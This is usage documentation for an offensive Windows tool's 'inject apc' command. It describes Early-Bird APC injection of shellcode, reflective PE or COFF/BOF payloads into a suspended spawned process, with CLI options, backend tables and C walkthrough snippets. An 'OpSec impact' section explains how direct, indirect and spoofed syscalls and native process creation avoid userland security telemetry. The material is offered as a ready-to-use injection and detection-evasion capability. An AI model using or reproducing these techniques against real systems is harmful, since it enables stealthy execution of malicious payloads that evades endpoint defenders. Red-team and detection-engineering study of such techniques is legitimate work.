# `unified inject apc` — Early-Bird APC Injection

**Implementation:** `pocs/src/cmd_inject_apc.c`
**Syntax:** `unified inject apc {shell|pe|coff} -f <payload> -t <target_image> [options]`

Spawns a target process in a suspended state, injects the payload, queues an APC to its initial thread, and resumes it. The syscall profile is the default: `--sys` with the direct invoker.

## Modes

| Mode | Chain entry point | Notes |
|---|---|---|
| `shell` | `snd_inj_apc_shell` | Raw shellcode payload |
| `pe` | `snd_inj_apc_pe` | Reflective PE bake against the remote base |
| `coff` | `snd_inj_apc_coff` | COFF sections + BOF symbols, entry `-e` (default `go`) |

All modes run: `create_target → alloc_remote → write_payload → set_protections → execute`.

## Options

```text
  -f <path>            Payload path (required).
  -t <path>            Executable to spawn as the suspended target (required).
  -e <name>            [coff] BOF entry symbol (default: "go").
  -a <args>            [coff] Single argument string passed to the BOF.
  --win                Win32 backend for loader + injector.
  --nt                 Native backend for loader + injector.
  --sys                Syscall backend for loader + injector (default).
  --invoke-direct      Syscall invoker: direct assembly (default).
  --invoke-indirect    Syscall invoker: indirect assembly.
  --invoke-spoofed     Syscall invoker: spoofed frame assembly.
  --resolve-scan       SSN resolver: in-memory scan (default).
  --resolve-sort       SSN resolver: export-table sort.
```

`-t` is converted to a wide string and stored in `inj.target_image_path`; both `-f` and `-t` must be fully qualified absolute paths on `--nt`/`--sys`.

> [!NOTE]
> The default invoker differs from `inject classic`: APC starts with `--invoke-direct`. Invoker/resolver flags are only effective with `--sys`.

## Backends

| Backend | Memory | Modules | Process | Thread | File |
|---|---|---|---|---|---|
| `--win` | `snd_mem_win` | `snd_mod_win` | `snd_proc_win` | `snd_thread_win` | `snd_file_win` |
| `--nt` | `snd_mem_nt` | `snd_mod_nt` | `snd_proc_nt` | `snd_thread_nt` | `snd_file_nt` |
| `--sys` | `snd_mem_sys` | `snd_mod_nt` | `snd_proc_sys` | `snd_thread_sys` | `snd_file_sys` |

## Walkthrough

### 1. Bind the backend and load the payload

```c
unified_backend_t be = {0};
unified_backend_init(backend, &scfg, &be);  // API_SYS also bootstraps KnownDlls ntdll

snd_buffer_t file_buf = {0};
unified_file_load(&be, file_path, &file_buf);
```

### 2. Configure the injection context

```c
wchar_t wide_target_path[SND_MAX_PATH];
snd_ascii_to_wide(wide_target_path, SND_MAX_PATH, target_path, SND_MAX_PATH - 1);

snd_inj_ctx_t inj     = {0};
inj.target_image_path = wide_target_path;  // spawned suspended by the chain
inj.proc_api          = be.proc_api;
inj.thread_api        = be.thread_api;
inj.payload           = &file_buf;         // shell mode
```

### 3. Run a mode

```c
// shell
snd_inj_apc_shell(&inj);

// pe
snd_ldr_pe_ctx_t ldr = {0};
ldr.mem_api = be.mem_api;
ldr.mod_api = be.mod_api;
ldr.raw_source = &file_buf;
snd_inj_apc_pe(&ldr, &inj);

// coff
snd_ldr_coff_ctx_t ldr = {0};
ldr.mem_api = be.mem_api;
ldr.mod_api = be.mod_api;
ldr.raw_source = &file_buf;
snd_inj_apc_coff(&ldr, &inj, "go", bof_args, bof_arg_len);
```

### 4. Cleanup

```c
snd_inj_cleanup(&inj);
snd_ldr_pe_free_mapped_image(&ldr);   // or snd_ldr_coff_free_mapped_image
snd_buffer_free(&file_buf);
```

## OpSec impact

- Target process creation uses the native path (`NtCreateUserProcess` under `--sys`/`--nt`), avoiding `CreateProcess` userland telemetry.
- APC queueing through the thread backend keeps execution off a freshly created remote thread.
- `--sys` keeps remote memory operations off userland `ntdll` stubs; process creation and APC queueing are picked up by kernel callbacks regardless of backend.

## See also

- [Injection internals](../injection/internals.md)
- [inject_classic.md](inject_classic.md) — injection into an existing process
- [cli.md](cli.md) — backend and syscall strategy reference
